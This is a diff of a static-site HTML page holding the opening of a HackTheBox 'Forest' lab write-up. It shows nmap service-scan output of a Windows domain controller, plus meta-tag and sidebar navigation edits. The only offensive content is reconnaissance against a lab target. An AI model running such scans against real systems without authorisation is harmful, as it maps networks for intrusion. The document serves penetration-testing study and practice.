@@ -10,35 +10,105 @@
 <link rel="icon" href="/favicon-32x32.png" type="image/png" sizes="32x32" />
 <link rel="apple-touch-icon" href="/apple-touch-icon.png" sizes="180x180" />
 <link fetchpriority="low" href="/site.webmanifest" rel="manifest" />
-
-  <title>Forest – zetsu</title>
+<title>Forest – zetsu</title>
   <meta name="description" content="Machine info https://app.hackthebox.com/machines/Forest
 Difficulty: Easy OS: Windows Release date: 12 Oct, 2019 Rooted on: 31 Jul, 2024 IP changes on target are due to machine resets.
 Foothold/User Q1: For which domain is this machine a Domain Controller? Ran port scan with nmap:
-$ cat nmap/initial.nmap # Nmap 7.94SVN scan initiated Thu Jul 25 17:11:19 2024 as: nmap -sCV -oN nmap/initial.nmap 10.129.95.210 Nmap scan report for 10.129.95.210 Host is up (0.17s latency)." />
-
-  
-    <link rel="canonical" href="http://localhost:1313/book/hackthebox-active-directory-101/forest/" itemprop="url" />
-  
-
-  
+$ cat nmap/initial.nmap # Nmap 7.94SVN scan initiated Thu Jul 25 17:11:19 2024 as: nmap -sCV -oN nmap/initial.nmap 10.129.95.210 Nmap scan report for 10.129.95.210 Host is up (0.17s latency). Scanned at 2024-07-25 17:11:19 -03 for 513s Not shown: 989 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-07-25 20:26:15Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2024-07-25T20:26:25 |_ start_date: 2024-07-25T18:00:00 |_clock-skew: mean: 2h26m50s, deviation: 4h02m32s, median: 6m48s | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: required | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: FOREST | NetBIOS computer name: FOREST\x00 | Domain name: htb.local | Forest name: htb.local | FQDN: FOREST.htb.local |_ System time: 2024-07-25T13:26:29-07:00 | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 36501/tcp): CLEAN (Couldn&#39;t connect) | Check 2 (port 37941/tcp): CLEAN (Couldn&#39;t connect) | Check 3 (port 32697/udp): CLEAN (Timeout) | Check 4 (port 13345/udp): CLEAN (Failed to receive data) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Jul 25 17:19:52 2024 -- 1 IP address (1 host up) scanned in 513.31 seconds R1: htb.local" /><link rel="canonical" href="http://localhost:1313/book/hackthebox-active-directory-101/forest/" itemprop="url" />
 
 <meta property="og:title" content="Forest" />
-<meta property="og:description" content="Machine info https://app.hackthebox.com/machines/Forest
-Difficulty: Easy OS: Windows Release date: 12 Oct, 2019 Rooted on: 31 Jul, 2024 IP changes on target are due to machine resets.
-Foothold/User Q1: For which domain is this machine a Domain Controller? Ran port scan with nmap:
-$ cat nmap/initial.nmap # Nmap 7.94SVN scan initiated Thu Jul 25 17:11:19 2024 as: nmap -sCV -oN nmap/initial.nmap 10.129.95.210 Nmap scan report for 10.129.95.210 Host is up (0.17s latency)." />
+<meta property="og:description" content="Machine info
+    
+https://app.hackthebox.com/machines/Forest
+
+Difficulty: Easy
+OS: Windows
+Release date: 12 Oct, 2019
+Rooted on: 31 Jul, 2024
+
+IP changes on target are due to machine resets.
+Foothold/User
+    Q1: For which domain is this machine a Domain Controller?
+    Ran port scan with nmap:
+
+
+$ cat nmap/initial.nmap 
+  
+    
+    
+  
+
+
+
+
+# Nmap 7.94SVN scan initiated Thu Jul 25 17:11:19 2024 as: nmap -sCV -oN nmap/initial.nmap 10.129.95.210
+Nmap scan report for 10.129.95.210
+Host is up (0.17s latency).
+Scanned at 2024-07-25 17:11:19 -03 for 513s
+Not shown: 989 closed tcp ports (conn-refused)
+PORT     STATE SERVICE      VERSION
+53/tcp   open  domain       Simple DNS Plus
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-07-25 20:26:15Z)
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2024-07-25T20:26:25
+|_  start_date: 2024-07-25T18:00:00
+|_clock-skew: mean: 2h26m50s, deviation: 4h02m32s, median: 6m48s
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: FOREST
+|   NetBIOS computer name: FOREST\x00
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: FOREST.htb.local
+|_  System time: 2024-07-25T13:26:29-07:00
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 36501/tcp): CLEAN (Couldn&#39;t connect)
+|   Check 2 (port 37941/tcp): CLEAN (Couldn&#39;t connect)
+|   Check 3 (port 32697/udp): CLEAN (Timeout)
+|   Check 4 (port 13345/udp): CLEAN (Failed to receive data)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Jul 25 17:19:52 2024 -- 1 IP address (1 host up) scanned in 513.31 seconds
+  
+    
+    
+  
+
+
+R1: htb.local" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="http://localhost:1313/book/hackthebox-active-directory-101/forest/" /><meta property="article:section" content="book" />
 <meta property="article:published_time" content="2024-08-19T11:27:31-03:00" />
 <meta property="article:modified_time" content="2024-08-19T11:27:31-03:00" />
 
-  
   <meta itemprop="name" content="Forest">
   <meta itemprop="description" content="Machine info https://app.hackthebox.com/machines/Forest
 Difficulty: Easy OS: Windows Release date: 12 Oct, 2019 Rooted on: 31 Jul, 2024 IP changes on target are due to machine resets.
 Foothold/User Q1: For which domain is this machine a Domain Controller? Ran port scan with nmap:
-$ cat nmap/initial.nmap # Nmap 7.94SVN scan initiated Thu Jul 25 17:11:19 2024 as: nmap -sCV -oN nmap/initial.nmap 10.129.95.210 Nmap scan report for 10.129.95.210 Host is up (0.17s latency).">
+$ cat nmap/initial.nmap # Nmap 7.94SVN scan initiated Thu Jul 25 17:11:19 2024 as: nmap -sCV -oN nmap/initial.nmap 10.129.95.210 Nmap scan report for 10.129.95.210 Host is up (0.17s latency). Scanned at 2024-07-25 17:11:19 -03 for 513s Not shown: 989 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-07-25 20:26:15Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2024-07-25T20:26:25 |_ start_date: 2024-07-25T18:00:00 |_clock-skew: mean: 2h26m50s, deviation: 4h02m32s, median: 6m48s | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: required | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: FOREST | NetBIOS computer name: FOREST\x00 | Domain name: htb.local | Forest name: htb.local | FQDN: FOREST.htb.local |_ System time: 2024-07-25T13:26:29-07:00 | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 36501/tcp): CLEAN (Couldn&#39;t connect) | Check 2 (port 37941/tcp): CLEAN (Couldn&#39;t connect) | Check 3 (port 32697/udp): CLEAN (Timeout) | Check 4 (port 13345/udp): CLEAN (Failed to receive data) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Jul 25 17:19:52 2024 -- 1 IP address (1 host up) scanned in 513.31 seconds R1: htb.local">
   <meta itemprop="datePublished" content="2024-08-19T11:27:31-03:00">
   <meta itemprop="dateModified" content="2024-08-19T11:27:31-03:00">
   <meta itemprop="wordCount" content="2201">
@@ -47,16 +117,13 @@ $ cat nmap/initial.nmap # Nmap 7.94SVN scan initiated Thu Jul 25 17:11:19 2024 a
   <meta name="twitter:description" content="Machine info https://app.hackthebox.com/machines/Forest
 Difficulty: Easy OS: Windows Release date: 12 Oct, 2019 Rooted on: 31 Jul, 2024 IP changes on target are due to machine resets.
 Foothold/User Q1: For which domain is this machine a Domain Controller? Ran port scan with nmap:
-$ cat nmap/initial.nmap # Nmap 7.94SVN scan initiated Thu Jul 25 17:11:19 2024 as: nmap -sCV -oN nmap/initial.nmap 10.129.95.210 Nmap scan report for 10.129.95.210 Host is up (0.17s latency).">
+$ cat nmap/initial.nmap # Nmap 7.94SVN scan initiated Thu Jul 25 17:11:19 2024 as: nmap -sCV -oN nmap/initial.nmap 10.129.95.210 Nmap scan report for 10.129.95.210 Host is up (0.17s latency). Scanned at 2024-07-25 17:11:19 -03 for 513s Not shown: 989 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-07-25 20:26:15Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2024-07-25T20:26:25 |_ start_date: 2024-07-25T18:00:00 |_clock-skew: mean: 2h26m50s, deviation: 4h02m32s, median: 6m48s | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: required | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: FOREST | NetBIOS computer name: FOREST\x00 | Domain name: htb.local | Forest name: htb.local | FQDN: FOREST.htb.local |_ System time: 2024-07-25T13:26:29-07:00 | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 36501/tcp): CLEAN (Couldn&#39;t connect) | Check 2 (port 37941/tcp): CLEAN (Couldn&#39;t connect) | Check 3 (port 32697/udp): CLEAN (Timeout) | Check 4 (port 13345/udp): CLEAN (Failed to receive data) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Jul 25 17:19:52 2024 -- 1 IP address (1 host up) scanned in 513.31 seconds R1: htb.local">
 
     <link href="/css/compiled/main.css" rel="stylesheet" />
 
 
 
   <link href="/css/custom.css" rel="stylesheet" />
-
-
-
 
 
   <script>
@@ -89,9 +156,9 @@ $ cat nmap/initial.nmap # Nmap 7.94SVN scan initiated Thu Jul 25 17:11:19 2024 a
 
   <nav class="hx-mx-auto hx-flex hx-items-center hx-justify-end hx-gap-2 hx-h-16 hx-px-6 hx-max-w-[90rem]">
     <a class="hx-flex hx-items-center hover:hx-opacity-75 ltr:hx-mr-auto rtl:hx-ml-auto" href="/">
-        <img class="hx-block dark:hx-hidden" src="/logo.png" alt="zetsu" height="20" width="40" />
-        <img class="hx-hidden dark:hx-block" src="/logo.png" alt="zetsu" height="20" width="40" />
-        <span class="hx-mx-2 hx-font-extrabold hx-inline hx-select-none" title="zetsu">zetsu</span>
+        <img class="hx-mr-2 hx-block dark:hx-hidden" src="/images/shade.png" alt="zetsu" height="20" width="40" />
+        <img class="hx-mr-2 hx-hidden dark:hx-block" src="/images/shade.png" alt="zetsu" height="20" width="40" />
+        <span class="hx-mr-2 hx-font-extrabold hx-inline hx-select-none" title="zetsu">zetsu</span>
     </a><a
             title="Book"
             href="/book"
@@ -137,13 +204,6 @@ $ cat nmap/initial.nmap # Nmap 7.94SVN scan initiated Thu Jul 25 17:11:19 2024 a
     <ul class="hx-flex hx-flex-col hx-gap-1 md:hx-hidden">
       
       
-          <li class=""><a
-    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
-      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
-    href="/blog/"
-    
-  >Blog
-    </a></li>
           <li class="open"><a
     class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
       hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
@@ -153,6 +213,49 @@ $ cat nmap/initial.nmap # Nmap 7.94SVN scan initiated Thu Jul 25 17:11:19 2024 a
         <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="hx-h-[18px] hx-min-w-[18px] hx-rounded-sm hx-p-0.5 hover:hx-bg-gray-800/5 dark:hover:hx-bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx-origin-center hx-transition-transform rtl:-hx-rotate-180"></path></svg></span>
     </a><div class="ltr:hx-pr-0 hx-overflow-hidden">
         <ul class='hx-relative hx-flex hx-flex-col hx-gap-1 before:hx-absolute before:hx-inset-y-1 before:hx-w-px before:hx-bg-gray-200 before:hx-content-[""] ltr:hx-ml-3 ltr:hx-pl-3 ltr:before:hx-left-0 rtl:hx-mr-3 rtl:hx-pr-3 rtl:before:hx-right-0 dark:before:hx-bg-neutral-800'><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/book/portswigger/"
+    
+  >PortSwigger
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="hx-h-[18px] hx-min-w-[18px] hx-rounded-sm hx-p-0.5 hover:hx-bg-gray-800/5 dark:hover:hx-bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx-origin-center hx-transition-transform rtl:-hx-rotate-180"></path></svg></span>
+    </a>
+              <div class="ltr:hx-pr-0 hx-overflow-hidden">
+        <ul class='hx-relative hx-flex hx-flex-col hx-gap-1 before:hx-absolute before:hx-inset-y-1 before:hx-w-px before:hx-bg-gray-200 before:hx-content-[""] ltr:hx-ml-3 ltr:hx-pl-3 ltr:before:hx-left-0 rtl:hx-mr-3 rtl:hx-pr-3 rtl:before:hx-right-0 dark:before:hx-bg-neutral-800'><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/book/portswigger/access-control/"
+    
+  >Access Control
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/book/portswigger/authentication/"
+    
+  >Authentication
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/book/portswigger/business-logic/"
+    
+  >Business Logic
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/book/portswigger/file-upload/"
+    
+  >File Upload
+    </a>
+              
+            </li></ul>
+      </div>
+            </li><li class="hx-flex hx-flex-col "><a
     class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
       hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
     href="/book/hackthebox-machines/"
@@ -260,6 +363,48 @@ $ cat nmap/initial.nmap # Nmap 7.94SVN scan initiated Thu Jul 25 17:11:19 2024 a
 
     <ul class="hx-flex hx-flex-col hx-gap-1 max-md:hx-hidden">
         
+          <li class=""><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/book/portswigger/"
+    
+  >PortSwigger
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="hx-h-[18px] hx-min-w-[18px] hx-rounded-sm hx-p-0.5 hover:hx-bg-gray-800/5 dark:hover:hx-bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx-origin-center hx-transition-transform rtl:-hx-rotate-180"></path></svg></span>
+    </a><div class="ltr:hx-pr-0 hx-overflow-hidden">
+        <ul class='hx-relative hx-flex hx-flex-col hx-gap-1 before:hx-absolute before:hx-inset-y-1 before:hx-w-px before:hx-bg-gray-200 before:hx-content-[""] ltr:hx-ml-3 ltr:hx-pl-3 ltr:before:hx-left-0 rtl:hx-mr-3 rtl:hx-pr-3 rtl:before:hx-right-0 dark:before:hx-bg-neutral-800'><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/book/portswigger/access-control/"
+    
+  >Access Control
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/book/portswigger/authentication/"
+    
+  >Authentication
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/book/portswigger/business-logic/"
+    
+  >Business Logic
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/book/portswigger/file-upload/"
+    
+  >File Upload
+    </a>
+              
+            </li></ul>
+      </div></li>
           <li class=""><a
     class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
       hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
@@ -440,7 +585,6 @@ $ cat nmap/initial.nmap # Nmap 7.94SVN scan initiated Thu Jul 25 17:11:19 2024 a
     <a href="#footholduser" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><h3>Q1: For which domain is this machine a Domain Controller?<span class="hx-absolute -hx-mt-20" id="q1-for-which-domain-is-this-machine-a-domain-controller"></span>
     <a href="#q1-for-which-domain-is-this-machine-a-domain-controller" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>Ran port scan with nmap:</p>
 <div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
-  
 
 <div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat nmap/initial.nmap </span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
   <button
@@ -451,13 +595,10 @@ $ cat nmap/initial.nmap # Nmap 7.94SVN scan initiated Thu Jul 25 17:11:19 2024 a
     <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
   </button>
 </div>
-
-  
 </div>
 <div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
-  
 
-<pre><code># Nmap 7.94SVN scan initiated Thu Jul 25 17:11:19 2024 as: nmap -sCV -oN nmap/initial.nmap 10.129.95.210
+<div><pre><code># Nmap 7.94SVN scan initiated Thu Jul 25 17:11:19 2024 as: nmap -sCV -oN nmap/initial.nmap 10.129.95.210
 Nmap scan report for 10.129.95.210
 Host is up (0.17s latency).
 Scanned at 2024-07-25 17:11:19 -03 for 513s
@@ -507,7 +648,7 @@ Host script results:
 
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Thu Jul 25 17:19:52 2024 -- 1 IP address (1 host up) scanned in 513.31 seconds</code></pre><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+# Nmap done at Thu Jul 25 17:19:52 2024 -- 1 IP address (1 host up) scanned in 513.31 seconds</code></pre></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
   <button
